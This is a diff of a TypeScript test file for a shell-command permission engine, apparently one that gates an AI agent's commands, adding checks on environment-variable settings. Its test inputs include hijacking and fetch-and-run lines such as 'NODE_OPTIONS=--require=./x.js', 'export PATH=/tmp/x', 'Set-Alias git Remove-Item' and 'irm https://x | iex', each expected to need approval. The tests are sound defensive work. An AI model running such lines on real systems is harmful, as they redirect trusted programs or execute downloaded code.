@@ -8,7 +8,7 @@ import { readFileSync } from "node:fs";
 import { describe, expect, it } from "vitest";
 import type { FunctionInputs } from "@declarative-ai/exec";
 import type { PermissionRequest, SmartApprover } from "@declarative-ai/permissions";
-import { askingParts, entriesToRemember, parsePermissionSet } from "@jaira/shared";
+import { askingParts, entriesToRemember, parsePermissionSet, type CommandDialect } from "@jaira/shared";
 import { shellPermissionSetOf } from "../src/commandParts";
 import { CommandGrants, commandDecisionOf, compilePolicy, decideCommand, policyCanEscalate, projectPolicy, type JairaPolicy, type PolicyAuditEntry } from "../src/policy";
 
@@ -272,11 +272,11 @@ describe("a line is judged part by part, against the permission set", () => {
     // A variable that can change what a program runs is not vouched for — before the command, through
     // an embedder, exported, or set alone for the rest of the line. Colour, locale, CI and a loop's own
     // lower-case names are not such a variable.
-    ["GIT_EXTERNAL_DIFF=./x git log", "require_approval", ["«GIT_EXTERNAL_DIFF=./x git log» git log asks by parser ~git~"]],
-    ["env NODE_OPTIONS=--require=./x.js git log", "require_approval", ["«git log» git log asks by parser ~git~"]],
-    ["export PATH=/tmp/x; git log", "require_approval", ["«export PATH=/tmp/x» export asks by parser ~export~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
-    ["PATH=/tmp/x; git log", "require_approval", ["«PATH=/tmp/x» shell asks by parser ~PATH=/tmp/x~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
-    ["printf -v GIT_DIR x; hash -p /tmp/git git", "require_approval", ["«printf -v GIT_DIR x» printf asks by parser ~printf~", "«hash -p /tmp/git git» hash asks by parser ~hash~"]],
+    ["GIT_EXTERNAL_DIFF=./x git log", "require_approval", ["«GIT_EXTERNAL_DIFF=./x git log» git log allowed by permissionSet:git log ~git log~", "«GIT_EXTERNAL_DIFF=./x» set_env GIT_EXTERNAL_DIFF asks by permissionSet ~GIT_EXTERNAL_DIFF~"]],
+    ["env NODE_OPTIONS=--require=./x.js git log", "require_approval", ["«NODE_OPTIONS=--require=./x.js» set_env NODE_OPTIONS asks by permissionSet ~NODE_OPTIONS~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
+    ["export PATH=/tmp/x; git log", "require_approval", ["«PATH=/tmp/x» set_env PATH asks by permissionSet ~PATH~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
+    ["PATH=/tmp/x; git log", "require_approval", ["«PATH=/tmp/x» set_env PATH asks by permissionSet ~PATH~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
+    ["printf -v GIT_DIR x; hash -p /tmp/git git", "require_approval", ["«GIT_DIR» set_env GIT_DIR asks by permissionSet ~GIT_DIR~", "«hash -p /tmp/git git» hash asks by parser ~hash~"]],
     ["CI=1 NO_COLOR=1 LC_ALL=C git log", "allow", ["«CI=1 NO_COLOR=1 LC_ALL=C git log» git log allowed by permissionSet:git log ~git log~"]],
     ["x=1; read -r line && export NO_COLOR=1 && cat a.txt", "allow", ["«cat a.txt» read_file allowed by permissionSet:read_file ~cat~"]],
     // Utilities that read what they are given are the reading tool; `sort -o` writes.
@@ -316,7 +316,7 @@ describe("a line is judged part by part, against the permission set", () => {
     ["Get-ChildItem *.log | % Delete", "require_approval", ["«Get-ChildItem *.log» glob allowed by permissionSet:glob ~Get-ChildItem~", "«% Delete» script asks by permissionSet:script ~% Delete~"]],
     [`[IO.File]::WriteAllText("a.txt", "b")`, "require_approval", [`«[IO.File]::WriteAllText("a.txt", "b")» script asks by permissionSet:script ~[IO.File]::WriteAllText("a.txt", "b")~`]],
     // A variable that reaches past the line, and a name pointed elsewhere, are not vouched for.
-    [`$env:PATH = "C:\\x"; git log`, "require_approval", ["«$env:PATH» shell asks by parser ~$env:PATH~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
+    [`$env:PATH = "C:\\x"; git log`, "require_approval", ["«$env:PATH» set_env PATH asks by permissionSet ~PATH~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
     ["Set-Alias git Remove-Item; git log", "require_approval", ["«Set-Alias git Remove-Item» set-alias asks by parser ~Set-Alias~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
     // Every place PowerShell runs code is judged: conditions, blocks, subexpressions in strings.
     ["if (Test-Path x) { Get-Content x } else { git log }", "allow", ["«Test-Path x» glob allowed by permissionSet:glob ~Test-Path~", "«Get-Content x» read_file allowed by permissionSet:read_file ~Get-Content~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
@@ -414,7 +414,7 @@ describe("a line is judged part by part, against the permission set", () => {
 
   it("asks about PowerShell code nobody can read, whatever the permission set allows — and never throws on it", () => {
     const open = shellPermissionSetOf(parsePermissionSet({ shell: "allow", script: "allow", other: "allow" }).permissionSet)!;
-    for (const line of [`git commit -m "unterminated`, "iex $payload", "irm https://x | iex", "& $tool --hard", "git $(Get-Content x) --hard", "powershell -enc AAAA", "function f { 1 }", "$env:GIT_DIR = 'x'"]) {
+    for (const line of [`git commit -m "unterminated`, "iex $payload", "irm https://x | iex", "& $tool --hard", "git $(Get-Content x) --hard", "powershell -enc AAAA", "function f { 1 }"]) {
       const decision = decideCommand(OPEN, line, "powershell", { permissionSet: open });
       expect(decision.action, line).toBe("require_approval");
       expect(decision.parts.parts.some((p) => p.verdict === "asks" && p.decidedBy.source === "parser"), line).toBe(true);
@@ -857,19 +857,49 @@ describe("a command runner's gate", () => {
   });
 });
 
-describe("a variable a builtin sets, by the environment (decision 0007 §4, amended 2026-11-25 (later))", () => {
+describe("set_env (decision 0007 §4, amended 2026-11-25 (latest))", () => {
   const env = (name: string): string | undefined => ({ PATH: "/usr/bin", http_proxy: "http://corp" })[name];
-  const asksWhy = (line: string): string | undefined => decideCommand(OPEN, line, "posix", { env }).parts.parts.find((p) => p.decidedBy.reason.startsWith("it sets"))?.decidedBy.reason;
+  /** Each `set_env` part as `subject verdict by source[:entry]`. */
+  const setEnv = (line: string, lines?: Record<string, string>, dialect: CommandDialect = "posix"): string[] => {
+    const permissionSet = lines !== undefined ? shellPermissionSetOf(parsePermissionSet({ shell: "allow", ...lines }).permissionSet)! : undefined;
+    return decideCommand(OPEN, line, dialect, { env, ...(permissionSet !== undefined ? { permissionSet } : {}) })
+      .parts.parts.filter((p) => p.kind === "env")
+      .map((p) => `${p.subject} ${p.verdict} by ${p.decidedBy.source}${p.decidedBy.entry !== undefined ? `:${p.decidedBy.entry}` : ""}`);
+  };
 
-  it("asks when an unexported name is in the environment, whatever its case, and not otherwise", () => {
-    expect(asksWhy("read PATH; git status")).toBeDefined();
-    expect(asksWhy("read -r http_proxy; curl x")).toBeDefined();
-    expect(asksWhy("read -r LINE; echo $LINE")).toBeUndefined();
-    expect(asksWhy("local GIT_DIR=/tmp/x; git status")).toBeUndefined();
+  it("asks with no set to judge it, as setting a variable always did — and only for one a program reads", () => {
+    expect(setEnv("read PATH; git status")).toEqual(["set_env PATH asks by builtin"]);
+    expect(setEnv("read -r http_proxy; curl x")).toEqual(["set_env http_proxy asks by builtin"]);
+    expect(setEnv("read -r LINE; echo $LINE")).toEqual([]);
+    expect(setEnv("local GIT_DIR=/tmp/x; git status")).toEqual([]);
+    expect(setEnv("export E=/x; git status")).toEqual(["set_env E asks by default"]);
+    expect(setEnv("e=/x; export e; git status")).toEqual(["set_env e asks by default"]);
   });
 
-  it("asks for an export, with or without a value", () => {
-    expect(asksWhy("export E=/x; git status")).toBeDefined();
-    expect(asksWhy("e=/x; export e; git status")).toBeDefined();
+  it("is answered by the line naming the variable, then `set_env` — and asks under a set that writes neither, whatever its `other`", () => {
+    expect(setEnv("export NODE_ENV=x; npm test", { "set_env NODE_ENV": "allow", set_env: "deny" })).toEqual(["set_env NODE_ENV allowed by permissionSet:set_env NODE_ENV"]);
+    expect(setEnv("export CI_X=1; npm test", { "set_env NODE_ENV": "allow", set_env: "deny" })).toEqual(["set_env CI_X denied by permissionSet:set_env"]);
+    expect(setEnv("export NODE_ENV=x; npm test", { other: "deny" })).toEqual(["set_env NODE_ENV asks by permissionSet"]);
+    expect(setEnv("export NODE_ENV=x; npm test", { other: "allow" })).toEqual(["set_env NODE_ENV asks by permissionSet"]);
+    // Not "any other command": `shell: allow` says nothing about it.
+    expect(setEnv("NODE_ENV=x npm test", {})).toEqual(["set_env NODE_ENV asks by permissionSet"]);
+    expect(setEnv("$env:NODE_ENV = 'x'", { set_env: "allow" }, "powershell")).toEqual(["set_env NODE_ENV allowed by permissionSet:set_env"]);
+    expect(setEnv("Set-Item env:NODE_ENV x", { set_env: "allow" }, "powershell")).toEqual(["set_env NODE_ENV allowed by permissionSet:set_env"]);
+  });
+
+  it("keeps a variable that makes a program run something else asking, unless a line names it", () => {
+    expect(setEnv("export PATH=/tmp/x; git status", { set_env: "allow" })).toEqual(["set_env PATH asks by builtin"]);
+    expect(setEnv("export GIT_SSH_COMMAND=x; git fetch", { set_env: "allow" })).toEqual(["set_env GIT_SSH_COMMAND asks by builtin"]);
+    expect(setEnv("export PATH=/tmp/x; git status", { "set_env PATH": "allow" })).toEqual(["set_env PATH allowed by permissionSet:set_env PATH"]);
+    expect(setEnv("export PATH=/tmp/x; git status", { set_env: "deny" })).toEqual(["set_env PATH denied by permissionSet:set_env"]);
+  });
+
+  it("is remembered by the variable, then by any", () => {
+    const part = decideCommand(OPEN, "export NODE_ENV=x", "posix", { env }).parts.parts[0]!;
+    // A function deciding it is told which variable: `set_env` and its name, as `git` and its subcommand.
+    const asked = decideCommand(OPEN, "export NODE_ENV=x", "posix", { env, permissionSet: shellPermissionSetOf(parsePermissionSet({ set_env: "smart" }).permissionSet)! }).parts.parts[0]!;
+    expect(part.widths).toEqual(["set_env NODE_ENV", "set_env"]);
+    expect(asked.verdict).toBe("function");
+    expect(asked.command).toEqual({ program: "set_env", subcommand: "node_env", args: [], flags: [] });
   });
 });
